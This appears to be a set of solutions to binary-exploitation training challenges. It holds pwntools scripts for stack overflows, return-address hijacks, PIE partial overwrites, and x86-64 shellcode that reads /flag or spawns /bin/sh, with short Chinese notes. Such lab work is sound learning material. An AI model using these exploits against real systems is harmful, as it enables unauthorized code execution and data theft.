## tmp
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
# io=connect('ip',port)
io=process('/challenge/binary-exploitation-')
elf=ELF('/challenge/binary-exploitation-')
# gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

### code

### 
#
io.interactive()
```
```sh
objdump file -d
```
## your first overflow (easy)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-first-overflow-w')

def sl(s):
	io.sendline(s)

### code 
pl=b'b'*4096
sl(pl)
### 
#
io.interactive()
```
## your first overflow (hard)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-first-overflow')

def sl(s):
	io.sendline(s)

### code 
pl=b'b'*4096
sl(pl)
### 
#
io.interactive()
```
## precision (easy)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('./binary-exploitation-lose-variable-w')

def sl(s):
	io.sendline(s)

### code 
pl=b'b'*78
sl(pl)
### 
#
io.interactive()
```
## precision (hard)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-lose-variable')

def sl(s):
	io.sendline(s)

### code 
pl=b'b'*0x22
sl(pl)
### 
#
io.interactive()
```
## variable control (easy)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-var-control-w')

def sd(s):
	io.send(s)

### code 
pl=b'b'*124+p64(2063959224)
sd(pl)
### 
#
io.interactive()
```
## variable control (hard)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-var-control')

def sd(s):
	io.send(s)

### code 
pl=b'b'*(0x20+4)+p64(193419296)
sd(pl)
### 
# 
io.interactive()
```
## control hijack (easy)
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-control-hijack-w')

def sd(s):
	io.send(s)

### code 
win=0x4022e6
pl=b'b'*(88)+p64(win)
sd(pl)
### 
# 
io.interactive()
```
## control hijack (hard)
```python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-control-hijack')

def sd(s):
	io.send(s)

### code 
win=0x0000000004017FB
pl=b'b'*(0x90+8)+p64(win)
sd(pl)
### 
# 
io.interactive()

```
## tricky control hijack (easy)
```python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io=process('./binary-exploitation-control-hijack-2-w')

def sd(s):
	io.send(s)

### code 
win=0x401c3d
pl=b'b'*(136)+p64(win)
sd(pl)
### 
# 
io.interactive()

```
## tricky control hijack (hard)
```python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io=process('./binary-exploitation-control-hijack-2')

def sd(s):
	io.send(s)

### code 
win=0x40220e
pl=b'b'*(0x40+8)+p64(win)
sd(pl)
### 
# 
io.interactive()

```
## pies (easy)
```python
import struct
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-pie-overflow-w')

def sd(s):
	io.send(s)

### code 
win=0x7126
pl=b'b'*(120)+struct.pack("<H",win)
sd(pl)
### 
# 
io.interactive()

```
```sh
for i in {1..20};do python /tmp/a.py; done
```
## pies (hard)
```python
import struct
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-pie-overflow')

def sd(s):
	io.send(s)

### code 
win=0x1f53
pl=b'b'*(0x60+8)+struct.pack("<H",win)
sd(pl)
### 
# 
io.interactive()

```
```sh
for i in {1..20};do python /tmp/a.py; done
```
## string lengths (easy)
```python
import struct
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-null-write-w')

def sd(s):
	io.send(s)

### code 
win=0x1c1f
pl=b'b\0'*(60)+struct.pack("<H",win)
sd(pl)
### 
# 
io.interactive()

```
## string lengths (hard)
```python
import struct
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
io=process('binary-exploitation-null-write')

def sd(s):
	io.send(s)

### code 
win=0x1b80
pl=b'\0'+b'b'*(0x70+7)+struct.pack("<H",win)
sd(pl)
### 
# 
io.interactive()

```
## basic shellcode
`/bin/sh`只能拿到非root的shell
```py
shellcode = asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
''')
```
换成`fd=open\('/flag',NULL\);sendfile(1,fd,0,1000)`打开文件并输出到stdout
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-basic-shellcode')

sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
pl=bytes(sc)

io.send(pl)
print(io.recvall().decode())
# io.interactive()

```
## nop sleds
填充足够的`nop`
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-nopsled-shellcode')

sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
pl=b'\x90'*0x800+bytes(sc)

io.send(pl)
print(io.recvall().decode())
# io.interactive()

```
## null-free shellcode
基本上就是数据中的空字节处理，sc方法不变
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-null-free-shellcode')
print(hex(0x1010101010101010^1000))
sc = asm('''
mov rbx,0x1010101010101010
mov rcx,0x10101077717c763f
xor rbx,rcx

push rbx

xor rax,rax
mov al,2

mov rdi,rsp
xor rsi,rsi
syscall

xor rdi,rdi
xor rdi,1
mov rsi,rax
xor rdx,rdx

mov ax,0x3e8
shl rax,48
shr rax,48
mov r10,rax

xor rax,rax
mov al,40

syscall

xor rax,rax
mov al,60
syscall
''')

print('\n',sc,'\n')
pl=bytes(sc)

io.send(pl)
print(io.recvall().decode())
# io.interactive()
```
## hijack to (mapped) shellcode (easy)
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-hijack-to-mmap-shellcode-w')

sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
sc=bytes(sc)

io.send(sc)

io.recvuntil('continue!\n')
io.sendline('')

pl=b'b'*(0x00007ffc173d78f0-0x00007ffc173d78c0+8)+p64(0x00000000300a8000)
io.send(pl)

print(io.recvall().decode())
# io.interactive()

```
## hijack to (mapped) shellcode (hard)
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-hijack-to-mmap-shellcode')

sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
sc=bytes(sc)

io.send(sc)

io.recvuntil('continue!\n')
io.sendline('')

pl=b'b'*(0x50+8)+p64(0x2e732000)
io.send(pl)

print(io.recvall().decode())
# io.interactive()

```
## hijack to shellcode (easy)
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('binary-exploitation-hijack-to-shellcode-w')

io.recvuntil('The input buffer begins at 0x')
ret=int(io.recv(12).decode(),16)
pl=b''
sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
pl+=bytes(sc)
pl+=b'\x90'*(0x640-0x5c0+8-len(sc))
pl+=p64(ret)

io.send(pl)

print(io.recvall().decode())
# io.interactive()

```
## hijack to shellcode (hard)
```python

from pwn import *
context(os='linux', arch='amd64')
io=process('/challenge/binary-exploitation-hijack-to-shellcode')

io.recvuntil('Send your payload (up to 4096 bytes)!\n')
ret=0x7fffffffd5b0
pl=b''
sc = asm('''
mov rbx, 0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
''')
pl+=bytes(sc)
pl+=b'\x90'*(0x70+8-len(sc))
pl+=p64(ret)

io.send(pl)

print(io.recvall().decode())
# io.interactive()

```
